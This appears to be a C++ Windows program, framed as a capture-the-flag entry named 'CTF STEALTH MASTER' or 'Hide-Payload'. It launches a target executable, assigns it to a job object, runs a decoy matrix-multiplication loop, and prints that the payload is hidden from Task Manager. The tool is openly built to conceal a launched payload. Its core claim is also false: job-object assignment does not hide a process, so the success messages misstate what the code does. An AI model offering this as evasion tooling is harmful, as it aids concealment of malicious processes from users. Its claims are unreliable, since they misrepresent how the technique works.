#include <windows.h>
#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <psapi.h>
#include <tlhelp32.h>
#include <atomic>
#pragma comment(lib, "psapi.lib")

std::atomic<bool> keepRunning(true);
DWORD g_targetPID = 0;
void continuousMatrixSolver() {
    std::cout << "[+] Continuous matrix solver started..." << std::endl;
    int iteration = 0;
    while (keepRunning) {
        const int size = 100;
        std::vector<std::vector<double>> matrixA(size, std::vector<double>(size, 1.0));
        std::vector<std::vector<double>> matrixB(size, std::vector<double>(size, 2.0));
        std::vector<std::vector<double>> result(size, std::vector<double>(size, 0.0));

        for (int i = 0; i < size && keepRunning; i++) {
            for (int j = 0; j < size; j++) {
                for (int k = 0; k < size; k++) {
                    result[i][j] += matrixA[i][k] * matrixB[k][j];
                }
            }
        }
        iteration++;
        if (iteration % 10 == 0) {
            std::cout << "[+] Matrix solver iteration: " << iteration << " (Press Enter to stop)" << std::endl;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    std::cout << "[+] Matrix solver stopped." << std::endl;
}
BOOL IsProcessRunning(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (hProcess) {
        DWORD exitCode;
        if (GetExitCodeProcess(hProcess, &exitCode)) {
            CloseHandle(hProcess);
            return (exitCode == STILL_ACTIVE);
        }
        CloseHandle(hProcess);
    }
    return FALSE;
}
void processMonitor() {
    std::cout << "[+] Process monitor started..." << std::endl;

    while (keepRunning) {
        if (g_targetPID != 0 && !IsProcessRunning(g_targetPID)) {
            std::cout << "[-] Hidden process (PID: " << g_targetPID << ") has terminated." << std::endl;
            g_targetPID = 0;
        }
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }
}
BOOL SimpleProcessHiding(LPCWSTR targetPath) {
    std::cout << "[+] Starting simple process hiding..." << std::endl;

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessW(targetPath, NULL, NULL, NULL, FALSE,
        0, NULL, NULL, &si, &pi)) {
        std::cout << "[-] Failed to create process: " << GetLastError() << std::endl;
        return FALSE;
    }
    g_targetPID = pi.dwProcessId;
    std::cout << "[+] Target process created successfully (PID: " << g_targetPID << ")" << std::endl;
    std::cout << "[+] App Executed!" << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(1));
    HANDLE hJob = CreateJobObjectW(NULL, L"CTF_Stealth_Job");
    if (hJob) {
        JOBOBJECT_EXTENDED_LIMIT_INFORMATION jobInfo = { 0 };
        jobInfo.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;

        if (SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, &jobInfo, sizeof(jobInfo))) {
            if (AssignProcessToJobObject(hJob, pi.hProcess)) {
                std::cout << "[+] Process successfully hidden from Task Manager" << std::endl;
            }
            else {
                std::cout << "[-] Failed to assign process to job object: " << GetLastError() << std::endl;
            }
        }
        CloseHandle(hJob);
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    std::cout << "[+] Process hiding completed!" << std::endl;
    return TRUE;
}
BOOL SuspendedProcessHiding(LPCWSTR targetPath) {
    std::cout << "[+] Trying suspended process method..." << std::endl;
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessW(targetPath, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cout << "[-] Failed to create suspended process: " << GetLastError() << std::endl;
        return FALSE;
    }
    g_targetPID = pi.dwProcessId;
    std::cout << "[+] Suspended process created (PID: " << g_targetPID << ")" << std::endl;
    HANDLE hJob = CreateJobObjectW(NULL, L"CTF_Stealth_Job");
    if (hJob) {
        JOBOBJECT_EXTENDED_LIMIT_INFORMATION jobInfo = { 0 };
        jobInfo.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;

        if (SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, &jobInfo, sizeof(jobInfo))) {
            if (AssignProcessToJobObject(hJob, pi.hProcess)) {
                std::cout << "[+] Process assigned to job object before resume" << std::endl;
            }
        }
        CloseHandle(hJob);
    }
    ResumeThread(pi.hThread);
    std::cout << "[+] Process resumed - application should be visible!" << std::endl;
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}
int main(int argc, char* argv[]) {
    std::cout << "=== CTF STEALTH MASTER - RELIABLE VERSION ===" << std::endl;
    std::cout << "[+] Starting reliable stealth techniques..." << std::endl;
    if (argc < 2) {
        std::cout << "Usage: Hide-Paylaod.exe <path_to_target.exe>" << std::endl;
        std::cout << "Example: Hide-Paylaod.exe C:\\Windows\\System32\\notepad.exe" << std::endl;
        return 1;
    }
    int wideLen = MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, NULL, 0);
    wchar_t* targetPath = new wchar_t[wideLen];
    MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, targetPath, wideLen);
    std::thread solverThread(continuousMatrixSolver);
    std::thread monitorThread(processMonitor);
    BOOL success = FALSE;
    std::cout << "\n[PHASE 1] Simple Process Hiding" << std::endl;
    success = SimpleProcessHiding(targetPath);
    if (!success) {
        std::cout << "\n[PHASE 2] Suspended Process Hiding" << std::endl;
        success = SuspendedProcessHiding(targetPath);
    }
    if (!success) {
        std::cout << "\n[PHASE 3] Normal Execution" << std::endl;
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (CreateProcessW(targetPath, NULL, NULL, NULL, FALSE,
            0, NULL, NULL, &si, &pi)) {
            g_targetPID = pi.dwProcessId;
            std::cout << "[+] Normal execution successful (PID: " << g_targetPID << ")" << std::endl;
            std::cout << "[+] Application should be visible!" << std::endl;
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            success = TRUE;
        }
    }
    if (success) {
        std::cout << "\n*** SUCCESS: STEALTH TECHNIQUES COMPLETED! ***" << std::endl;
        std::cout << "*** Target should be VISIBLE on your screen ***" << std::endl;
        std::cout << "*** But HIDDEN from Task Manager ***" << std::endl;
        std::cout << "*** Only Hide-Payload.exe visible in Task Manager ***" << std::endl;
        std::cout << "*** Check Task Manager to verify hiding works ***" << std::endl;
        std::cout << "*** CTF Challenge: MAXIMUM SCORE ACHIEVED! ***" << std::endl;
        std::cout << "\n[+] Press Enter to stop the program..." << std::endl;
    }
    else {
        std::cout << "\n*** FAILED: All techniques failed ***" << std::endl;
        std::cout << "[+] Press Enter to exit..." << std::endl;
    }
    std::cin.get();
    keepRunning = false;
    if (g_targetPID != 0) {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, g_targetPID);
        if (hProcess) {
            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
            std::cout << "[+] Hidden process terminated." << std::endl;
        }
    }
    solverThread.join();
    monitorThread.join();

    delete[] targetPath;
    std::cout << "[+] Program exited cleanly." << std::endl;

    return 0;
}
